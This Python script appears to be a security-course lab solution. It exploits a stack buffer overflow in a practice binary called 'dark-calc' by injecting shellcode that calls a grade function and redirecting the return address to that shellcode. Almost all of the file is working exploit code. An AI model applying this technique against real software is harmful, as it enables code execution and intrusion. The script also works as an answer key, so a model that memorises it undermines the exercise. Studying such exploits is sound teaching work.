#!/usr/bin/env python3
"""Task 2: stack-code execution against attack/dark-calc.

`dark-calc` maps a *fixed*, readable/writable/executable stack at
0x721000000000 (see init_fixed_stack / __wrap_main in the disassembly), and
`__wrap_main` sets rsp = 0x721000801000 before calling main().  Therefore the
16-byte `expression` buffer of input() is always at 0x721000800fd0 and we can
both write machine code there and jump to it with an absolute address.

Shellcode: mov edi, 4; movabs rax, grade_eval; call rax; ud2
(The ud2 only stops the process after grade_eval has already flushed stdout.)
"""
import struct
import sys

BUF = 0x721000800FD0       # address of expression[] on the fixed stack
GRADE_EVAL = 0x401A87      # void grade_eval(int grade)

shellcode = (
    b"\xbf\x04\x00\x00\x00"                      # mov  edi, 4
    + b"\x48\xb8" + struct.pack("<Q", GRADE_EVAL)  # movabs rax, grade_eval
    + b"\xff\xd0"                                # call rax
    + b"\x0f\x0b"                                # ud2 (grade already printed)
)

payload = shellcode.ljust(24, b"\x90")           # 16-byte buffer + saved rbp
payload += struct.pack("<Q", BUF)                # return address -> shellcode

sys.stdout.buffer.write(payload)
